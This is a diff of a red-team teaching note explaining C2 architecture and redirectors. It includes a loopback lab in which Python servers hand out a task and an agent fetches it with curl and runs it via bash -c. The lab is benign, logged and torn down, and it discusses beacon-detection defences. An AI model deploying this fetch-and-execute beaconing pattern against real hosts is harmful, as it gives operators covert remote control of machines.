@@ -10,7 +10,7 @@ tags:
   - tree/offensive
   - cyber/offensive/redteam
   - type/technique
-  - level/root
+  - difficulty/hard
 Domain: "[[C2 Infrastructure & Operational Security]]"
 Color: "#DC143C"
 ---
@@ -23,7 +23,7 @@ Color: "#DC143C"
 ## Parent Learning Order
 C2 Infrastructure & Redirectors -> Operational Security, Anti-Forensics & Teardown
 
-## Start at Zero: How Operators Talk to Their Foothold
+## How Operators Talk to Their Foothold
 
 Once a red team has a foothold, it needs a reliable, controllable channel to task the agent and receive results — **Command and Control (C2)**. And it needs that channel to be *resilient*: if the client blocks one address, the operation shouldn't collapse. **Redirectors** provide that resilience by separating the public-facing ingress (what the agent talks to) from the real control server (where operators work), so the front can be replaced without exposing or losing the back. This note covers both — the C2 architecture and the redirector/traffic-governance layer — because together they are the *communications backbone* of every red team operation.
 
@@ -60,7 +60,62 @@ flowchart LR
 
 Domain/traffic governance means owning the domains, controlling DNS/TLS, honoring provider terms, logging, and — always — a documented **teardown** (next leaf). Techniques like domain fronting or abusing third-party trust may violate provider terms and are not assumed available.
 
-## Failure Modes and Interpretation
+## Worked Example: An Agent That Never Talks to the Control Server
+
+A C2 redirector exists so that the thing the defender can see — the address the
+agent beacons to — is never the thing worth protecting. Modelling an agent, a
+redirector, and a hidden control plane on loopback shows the indirection and the
+signal it does and does not hide.
+
+**The topology** is three parties: the agent beacons to the redirector, the
+redirector forwards one specific path to the control server, and the control
+server is never contacted directly.
+
+**Default-deny at the redirector** is what makes it more than a proxy:
+
+```shell-session
+operator@lab:/tmp/c2-lab$ curl -s -o /dev/null -w "GET /random -> HTTP %{http_code}\n" http://127.0.0.1:9100/random
+GET /random -> HTTP 404
+```
+
+Anything that is not the agreed beacon path gets a decoy 404. A defender or a
+curious scanner poking the redirector sees an unremarkable web server that serves
+nothing interesting, because the policy forwards exactly one path and denies the
+rest.
+
+**The beacon** retrieves a task and runs it, having spoken only to the redirector:
+
+```shell-session
+operator@lab:/tmp/c2-lab$ TASK=$(curl -s http://127.0.0.1:9100/beacon); echo "task: $TASK"
+task: echo CANARY-TASK-EXECUTED
+operator@lab:/tmp/c2-lab$ bash -c "$TASK"
+CANARY-TASK-EXECUTED
+```
+
+The agent's entire world is `127.0.0.1:9100`. The real control plane on `:9101`
+issued the task, but the agent has no knowledge of it and never connected to it —
+so seizing or blocking the redirector's address, which is the only one visible in
+the agent, costs the operator a disposable forwarder and reveals nothing about the
+control server behind it.
+
+**What the indirection does not hide** is the behaviour, and an authorized
+operation records exactly that:
+
+```shell-session
+operator@lab:/tmp/c2-lab$ cat audit.log
+check-in 127.0.0.1 /task
+```
+
+The control plane logged the check-in — the transparency an authorized engagement
+requires. And the defender's signal survives every layer of redirection: a host
+that reaches out to the same external address on a regular cadence is beaconing,
+whatever clever infrastructure sits on the far end. Redirectors protect the
+*operator's* infrastructure from discovery; they do nothing to hide the *client
+host's* periodic outbound connection, which is why egress control and beacon-cadence
+detection — jitter analysis, destination rarity, regular small requests — are the
+defences that actually engage the technique rather than the plumbing.
+
+## Pointing agents straight at your control server
 
 - **No redirector.** Pointing agents straight at the control server means one block/seizure ends the operation and exposes your infrastructure — always front it.
 - **Beacon interval too aggressive.** A fast, fixed-interval beacon is trivially detected as periodic callback; jitter and realistic intervals matter (and are exactly what defenders hunt).
@@ -75,112 +130,13 @@ Domain/traffic governance means owning the domains, controlling DNS/TLS, honorin
 - **Redirector awareness:** defenders can't see the real C2 behind a redirector, so detection focuses on the *agent's behavior* (beacon pattern) rather than the destination.
 - **Threat intel + TLS inspection:** blocking known-bad infrastructure and inspecting encrypted traffic surfaces C2 that blends into HTTPS.
 
-## Authorized Lab: A Transparent Beacon Through a Redirector
+## Summary
 
-> [!info] Runs on one Linux machine with Python — a benign agent beacons to a redirector that forwards to a control server; the control server tasks it with a canary command
-> Everything is loopback and logged (transparent, not concealed). Step 5 tears it down.
+You should now be able to:
 
-### Step 1 — A control server that hands out one canary task and logs check-ins
-
-```bash
-mkdir -p /tmp/c2-lab && cd /tmp/c2-lab
-cat > control.py <<'EOF'
-from http.server import BaseHTTPRequestHandler, HTTPServer
-TASK=b"echo C2R-CANARY-TASK-EXECUTED"
-class H(BaseHTTPRequestHandler):
-    def log_message(self,*a): open("/tmp/c2-lab/audit.log","a").write("check-in %s %s\n"%(self.client_address[0],self.path))
-    def do_GET(self):
-        self.send_response(200); self.end_headers(); self.wfile.write(TASK)   # task the agent
-HTTPServer(("127.0.0.1",9101),H).serve_forever()
-EOF
-python3 control.py &>/dev/null & echo "control plane up on 127.0.0.1:9101 (audited)"
-sleep 1
-```
-
-```text
-control plane up on 127.0.0.1:9101 (audited)
-```
-
-### Step 2 — A redirector that default-denies and forwards only the beacon path
-
-```bash
-cd /tmp/c2-lab
-cat > redirector.py <<'EOF'
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import urllib.request
-CONTROL="http://127.0.0.1:9101"
-class H(BaseHTTPRequestHandler):
-    def log_message(self,*a): pass
-    def do_GET(self):
-        if self.path=="/beacon":                       # policy: only this path forwards
-            data=urllib.request.urlopen(CONTROL+"/task").read()
-            self.send_response(200); self.end_headers(); self.wfile.write(data)
-        else:
-            self.send_response(404); self.end_headers(); self.wfile.write(b"decoy")  # default-deny
-HTTPServer(("127.0.0.1",9100),H).serve_forever()
-EOF
-python3 redirector.py &>/dev/null & echo "redirector up on 127.0.0.1:9100 (default-deny; forwards /beacon only)"
-sleep 1
-```
-
-```text
-redirector up on 127.0.0.1:9100 (default-deny; forwards /beacon only)
-```
-
-### Step 3 — The agent beacons to the REDIRECTOR (never the control server) and runs the task
-
-```bash
-cd /tmp/c2-lab
-echo "--- non-beacon path is denied (default-deny) ---"
-curl -s -o /dev/null -w "GET /random -> HTTP %{http_code}\n" http://127.0.0.1:9100/random
-echo "--- agent beacon: fetch task via redirector, execute it ---"
-TASK=$(curl -s http://127.0.0.1:9100/beacon)
-echo "received task: $TASK"
-bash -c "$TASK"     # benign canary command
-```
-
-```text
---- non-beacon path is denied (default-deny) ---
-GET /random -> HTTP 404
---- agent beacon: fetch task via redirector, execute it ---
-received task: echo C2R-CANARY-TASK-EXECUTED
-C2R-CANARY-TASK-EXECUTED
-```
-
-The agent only ever talked to `127.0.0.1:9100` (the redirector); the real control plane at `:9101` stayed hidden behind it. The redirector denied a non-policy path and forwarded only the beacon — and the control plane logged the check-in.
-
-### Step 4 — Show the transparency (audit log) and the defender's signal
-
-```bash
-cd /tmp/c2-lab
-echo "--- immutable-style audit (authorized transparency) ---"; cat audit.log
-echo "Defender's view: a periodic outbound beacon to a single host = the C2 signal. Fix: egress control + beacon-pattern detection."
-```
-
-```text
---- immutable-style audit (authorized transparency) ---
-check-in 127.0.0.1 /task
-Defender's view: a periodic outbound beacon to a single host = the C2 signal. Fix: egress control + beacon-pattern detection.
-```
-
-### Step 5 — Teardown (kill switch)
-
-```bash
-pkill -f 'c2-lab/control.py'; pkill -f 'c2-lab/redirector.py'
-cd /; rm -rf /tmp/c2-lab; ls -d /tmp/c2-lab 2>&1 | tail -1
-```
-
-```text
-ls: cannot access '/tmp/c2-lab': No such file or directory
-```
-
-**What you should now be able to do:** describe the C2 architecture (agent/control/listener/redirector/audit), explain beaconing and channel trade-offs (reliability/auditability/detectability), build a transparent redirector that default-denies and hides the control plane, and name the beacon-pattern/egress-control defenses.
-
-## Crook → Operator → Root Checkpoint
-
-- **Crook:** Explain what C2 is, what beaconing is, and why a redirector separates public ingress from the real control server.
-- **Operator:** Stand up a transparent, audited C2 with a default-deny redirector, and task a canary agent through it.
-- **Root:** Compare C2 channels by reliability/auditability/detectability, explain why beacon patterns and egress control are the decisive defenses, and why authorized C2 must be signed/RBAC'd/kill-switched/audited.
+- Explain what C2 is, what beaconing is, and why a redirector separates public ingress from the real control server.
+- Stand up a transparent, audited C2 with a default-deny redirector, and task a canary agent through it.
+- Compare C2 channels by reliability/auditability/detectability, explain why beacon patterns and egress control are the decisive defenses, and why authorized C2 must be signed/RBAC'd/kill-switched/audited.
 
 ---
 > 🔼 Up: [[C2 Infrastructure & Operational Security]]
